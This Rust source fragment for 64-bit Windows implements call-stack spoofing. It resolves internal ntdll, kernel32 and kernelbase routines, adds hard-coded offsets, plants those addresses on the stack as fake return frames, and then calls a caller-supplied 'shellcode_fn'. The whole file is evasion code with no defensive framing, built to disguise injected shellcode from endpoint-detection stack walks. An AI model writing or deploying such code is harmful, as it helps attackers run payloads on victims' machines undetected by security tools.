#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
pub unsafe fn spoof_and_call(shellcode_fn: extern "C" fn()) {
    use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};

    let ntdll    = GetModuleHandleA(b"ntdll.dll\0".as_ptr());
    let k32      = GetModuleHandleA(b"kernel32.dll\0".as_ptr());
    let kbase    = GetModuleHandleA(b"kernelbase.dll\0".as_ptr());

    let rts      = GetProcAddress(ntdll,  b"RtlUserThreadStart\0".as_ptr());
    let btit     = GetProcAddress(k32,    b"BaseThreadInitThunk\0".as_ptr());
    let ldr      = GetProcAddress(ntdll,  b"LdrLoadDll\0".as_ptr());
    let ldrp_ptr = GetProcAddress(ntdll,  b"LdrpLoadDll\0".as_ptr());
    let llew     = GetProcAddress(kbase,  b"LoadLibraryExW\0".as_ptr());

    let f1 = if llew != 0 { (core::mem::transmute::<_, usize>(llew)).wrapping_add(0x1B0) } else { 0 };
    let f2 = if ldr  != 0 { (core::mem::transmute::<_, usize>(ldr)).wrapping_add(0x9F)  } else { 0 };
    let f3 = if ldrp_ptr != 0 {
        (core::mem::transmute::<_, usize>(ldrp_ptr)).wrapping_add(0x1F3)
    } else if ldr != 0 {
        (core::mem::transmute::<_, usize>(ldr)).wrapping_add(0x150)
    } else { 0 };
    let f4 = if rts  != 0 { (core::mem::transmute::<_, usize>(rts)).wrapping_add(0x14)  } else { 0 };
    let f5 = if btit != 0 { (core::mem::transmute::<_, usize>(btit)).wrapping_add(0x10) } else { 0 };

    core::arch::asm!(
        "sub rsp, 0x60",
        "mov qword ptr [rsp+0x58], {f5}",
        "mov qword ptr [rsp+0x50], {f4}",
        "mov qword ptr [rsp+0x48], {f3}",
        "mov qword ptr [rsp+0x40], {f2}",
        "mov qword ptr [rsp+0x38], {f1}",
        "call {fn}",
        "add rsp, 0x60",
        fn = in(reg) shellcode_fn,
        f1 = in(reg) f1,
        f2 = in(reg) f2,
        f3 = in(reg) f3,
        f4 = in(reg) f4,
        f5 = in(reg) f5,
        options(nostack),
    );
}
